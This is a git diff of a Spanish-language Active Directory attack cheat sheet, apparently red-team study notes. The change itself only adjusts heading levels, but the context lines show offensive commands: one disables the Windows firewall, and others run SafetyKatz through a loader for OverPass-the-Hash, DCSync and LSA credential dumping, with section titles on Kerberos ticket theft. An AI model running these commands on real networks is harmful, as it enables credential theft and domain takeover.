@@ -109,7 +109,7 @@ netsh advfirewall set allprofiles state off
 ----
 ### SafetyKatz
 
-##### OverPass-the-Hash
+#### OverPass-the-Hash
 
 Realizar `Pass-the-Hash (PtH)` a través de `SafetyKatz` desde nuestra máquina atacante. (Requiere ejecutar la terminal como Administrador)
 ```powershell
@@ -119,7 +119,7 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::evasive
 ```
 ----
 
-##### DCSync
+#### DCSync
 
 Realizar `DCSync` desde `SafetyKatz` de diferentes maneras, dependiendo el contexto
 ```powershell
@@ -134,7 +134,7 @@ C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "lsa
 ```
 ----
 
-##### Dump Kerberos Tickets and PTT (Pass-The-Ticket)
+#### Dump Kerberos Tickets and PTT (Pass-The-Ticket)
 
 Exportar los tickets de Kerberos.
 ```powershell
@@ -154,7 +154,7 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\SafetyKatz.exe -args "kerberos::evasive
 ```
 ----
 
-##### LSADump (SAM, LSA and Trust)
+#### LSADump (SAM, LSA and Trust)
 
 - SAM
 
@@ -198,7 +198,7 @@ C:\Users\Public\Loader.exe -Path http://127.0.0.1:8080/SafetyKatz.exe -args "lsa
 ```
 ----
 
-##### Credential Extraction (keys and vault)
+#### Credential Extraction (keys and vault)
 
 Extraer credenciales de Kerberos mediante `SafetyKatz` y el módulo `sekurlsa::evasive-keys`:
 ```powershell
